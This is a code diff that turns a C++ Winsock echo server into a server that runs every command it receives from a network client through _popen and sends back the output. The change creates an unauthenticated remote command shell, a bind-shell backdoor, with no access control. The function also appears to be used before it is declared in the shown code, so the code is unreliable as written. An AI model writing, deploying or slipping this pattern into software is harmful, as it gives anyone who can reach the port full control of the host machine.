@@ -2,6 +2,9 @@
 #include <string>
 #include <WS2tcpip.h>
 #include <winsock2.h>
+#include <windows.h>
+#include <vector>
+#include <fstream>
 
 #pragma comment (lib, "ws2_32.lib")
 
@@ -56,7 +59,7 @@ int main() {
     // Close listening socket
     closesocket(listening);
 
-    // While loop: accept and echo message back to client
+    // While loop: accept and execute commands from the client
     char buf[4096];
     while (true) {
         ZeroMemory(buf, 4096);
@@ -73,15 +76,38 @@ int main() {
             break;
         }
 
-        // Echo message back to client
-        send(clientSocket, buf, bytesReceived + 1, 0);
+        // Execute the received command and capture the output
+        std::string command(buf, bytesReceived);
+        std::string output = execute_command(command);
+
+        // Send the command output back to the client
+        send(clientSocket, output.c_str(), output.size() + 1, 0);
     }
 
-    // Close the socket
+    // Close the client socket
     closesocket(clientSocket);
 
     // Cleanup Winsock
     WSACleanup();
 
     return 0;
+}
+
+std::string execute_command(const std::string& command) {
+    // Execute the received command using popen
+    FILE* pipe = _popen(command.c_str(), "r");
+    if (!pipe) {
+        return "Error executing command.";
+    }
+
+    std::string result;
+    char buffer[128];
+    while (!feof(pipe)) {
+        if (fgets(buffer, 128, pipe) != NULL) {
+            result += buffer;
+        }
+    }
+
+    _pclose(pipe);
+    return result;
 }
